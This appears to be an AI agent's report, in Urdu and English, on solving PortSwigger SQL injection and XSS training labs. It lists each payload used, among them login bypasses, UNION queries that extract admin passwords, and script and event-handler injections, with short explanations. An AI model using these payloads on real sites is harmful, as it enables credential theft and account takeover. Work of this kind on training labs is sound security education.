# PortSwigger Labs — Progress Report (15 Nov 2026)

**Total: 25 / 48 labs solved aur verify hue** (SQL Injection 11/18, XSS 14/30).
Kaam 15 Nov ~14:00–16:16 PKT chala, PortSwigger account "Arbaz Ahmed Naveed" (arbazchuahan@gmail.com) se signed in.
Sab labs sirf PortSwigger ke apne training lab domains par solve hue — legal labs, permission wala tareeqa.

## SQL Injection — 11 solved

1. **WHERE clause, hidden data** — `Gifts' OR 1=1--` — saare 20 products mile, jin mein 8 unreleased bhi the. Kyun: `OR 1=1` har row ke liye true ho jata hai.
2. **Login bypass** — username `administrator'--`, password `x` — admin login ho gaya. Kyun: `--` ke baad password check comment ho jata hai.
3. **Oracle version** — `Gifts' UNION SELECT banner, NULL FROM v$version--` — "Oracle Database 11g Express Edition Release 11.2.0.2.0" mila. Kyun: UNION version wali rows ko result mein le aata hai.
4. **MySQL/Microsoft version** — `Gifts' UNION SELECT @@version, NULL-- ` (aakhir mein space zaroori) — "8.0.42-0ubuntu0.20.04.1" mila. Kyun: `@@version` MySQL ka version deta hai.
5. **Non-Oracle DB contents** — pehle `information_schema.tables/columns` se users table dhoondha, phir `Gifts' UNION SELECT username_kttagt, password_qwpqpr FROM users_vvbeiz--` — admin password mila, login ho gaya. Kyun: information_schema database ki apni tables aur columns batata hai.
6. **Oracle DB contents** — `all_tables/all_tab_columns` se structure dhoondha, phir `Gifts' UNION SELECT USERNAME_TTIDXF, PASSWORD_TKNTFR FROM USERS_DCAWFW--` — admin password mila. Kyun: Oracle ke ye views database ka structure batate hain.
7. **UNION, columns ki tadad** — `Gifts' UNION SELECT NULL,NULL,NULL--` — solved. Kyun: NULLs ki tadad query ke 3 columns ke barabar thi.
8. **UNION, text wala column** — `Gifts' UNION SELECT NULL, 's91gAp', NULL--` — text nazar aaya. Kyun: doosra column text wala hai, string wahin dikhti hai.
9. **UNION, doosri table se data** — `Gifts' UNION SELECT username, password FROM users--` — admin password mila. Kyun: UNION alag table ka data bhi result mein le aata hai.
10. **UNION, ek column mein do values** — `Gifts' UNION SELECT NULL, username||'~'||password FROM users--` — `administrator~t17x3ik9re6kgfqm5v5g` mila. Kyun: `||` username aur password ko jor deta hai.
11. **XML encoding filter bypass (Lab 18)** — is account par pehle se Solved tha; dobara nahi kiya.

## Cross-Site Scripting (XSS) — 14 solved

1. **Reflected XSS, HTML, nothing encoded** — `/?search=<script>alert(1)</script>` — alert chala. Kyun: search term bina encoding ke page mein aa jata hai.
2. **Stored XSS, HTML, nothing encoded** — comment `<script>alert(1)</script>` — submit karte hi solved. Kyun: comment save ho kar HTML ki tarah dikhaya jata hai.
3. **DOM XSS, document.write** — `/?search="><svg onload=alert(1)>` — alert chala. Kyun: search term `<img src="...">` ke andar likha jata hai, `">` se bahar nikal aata hai.
4. **DOM XSS, innerHTML** — `/?search=<svg onload=alert(1)>` — alert chala. Kyun: innerHTML se SVG banta hai aur onload chalta hai.
5. **DOM XSS, jQuery href** — `/feedback?returnPath=javascript:alert(document.cookie)`, phir "Back" link click — alert chala. Kyun: jQuery Back link ka href returnPath se lagata hai.
6. **DOM XSS, jQuery selector, hashchange** — exploit-server iframe, hash `#<img src=x onerror=print()>` — print chala. Kyun: hash badalne se handler chalta hai aur `$()` img banata hai.
7. **Reflected XSS, attribute, angle brackets encoded** — `/?search=" autofocus onfocus=alert(1) x="` — alert chala. Kyun: angle brackets encode hain lekin double-quote nahi, is liye attribute se bahar nikal kar onfocus lag gaya.
8. **Stored XSS, anchor href, double quotes encoded** — comment ki website `javascript:alert(1)` — submit par solved. Kyun: author ka naam us website se link hota hai.
9. **Reflected XSS, JavaScript string, angle brackets encoded** — `/?search='-alert(1)-'` — alert chala. Kyun: `'` se string band hoti hai aur `-alert(1)-` code ban jata hai.
10. **DOM XSS, document.write, select element** — `</option></select><img src=x onerror=alert(1)>` via storeId — solved. Kyun: value `<select><option>` ke andar likhi jati hai, dono tags band karne parte hain.
11. **DOM XSS, AngularJS expression** — `/?search={{$on.constructor('alert(1)')()}}` — alert chala. Kyun: search term AngularJS expression ki tarah evaluate hota hai.
12. **Reflected DOM XSS** — `/?search=\"-alert(1)}//` — alert chala. Kyun: backslash-quote JSON string se bahar nikalta hai aur `eval()` code chalata hai.
13. **Stored DOM XSS** — comment `<><img src=1 onerror=alert(1)>` — dobara dekhne par alert chala. Kyun: pehla `<>` sanitizer ki encoding kha jata hai, asal img bach jata hai.
14. **Reflected XSS, most tags blocked** — exploit-server iframe `?search="><body onresize=print()>` + iframe resize — Solved. Kyun: injected body asal body se mil jata hai aur resize par onresize chalta hai.

## Kahan ruka aur kyun

- **XSS Lab 15** ("Reflected XSS, all tags blocked except custom ones") — exploit exploit-server par save ho gaya, lekin **"Deliver exploit to victim" wala click safety check ne rok diya**. Lab 15 verify nahi hua — ye step sirf aap khud browser mein ek click se kar sakte hain.
- **SQLi Labs 11–17 (7 blind labs)** — in mein `TrackingId` cookie badalni parti hai; browser se cookie edit nahi hoti. Ye **Burp Suite** se honge (aap Burp seekh rahe hain) — uska tareeqa alag se sikha dunga.
- **Baaki: XSS Labs 16–30 (16 labs)** — fresh task se continue ho rahe hain. Jo labs victim-delivery click mangenge, woh aapke ek click ke liye note kar liye jayenge.

## Agla step

1. XSS 16–30 continue (browser task chal raha hai).
2. Lab 15 + victim-delivery wale labs — aap ek click se khud karenge (main bata dunga kab).
3. Blind SQLi 11–17 — Burp Suite se, seekhne ke saath.
